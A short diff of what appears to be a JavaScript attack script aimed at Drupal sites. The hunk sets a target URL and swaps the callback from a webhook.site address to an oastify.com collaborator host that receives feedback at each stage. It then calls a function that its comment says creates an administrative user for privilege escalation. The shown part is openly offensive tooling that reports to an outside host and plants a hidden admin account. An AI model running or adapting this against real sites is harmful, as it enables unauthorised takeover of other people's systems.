@@ -28,7 +28,7 @@ rain   nrainrainrainrainrainrainr
 // ************************************ ~% Variables %~ ************************************ //
 
 var Target = "https://local.bmwhk.com/"; // Ex: https://192.168.84.212:8000/drupal/
-var Callback = "https://webhook.site/a1a61198-ab2d-43f8-9e35-2d9f8ac0c4eb"; // Ex: https://collaborator.oastify.com/ (optional) (only if you want to receive feedback at each stage).
+var Callback = "http://mc23tva4rta9fuyukxu758bep5vwjm7b.oastify.com"; // Ex: https://collaborator.oastify.com/ (optional) (only if you want to receive feedback at each stage).
 
 // ************************************ ~% Functions %~ ************************************ //
 DPCreateAccount(); // (Privilege Escalation) - Creates an Administrative user in Drupal.
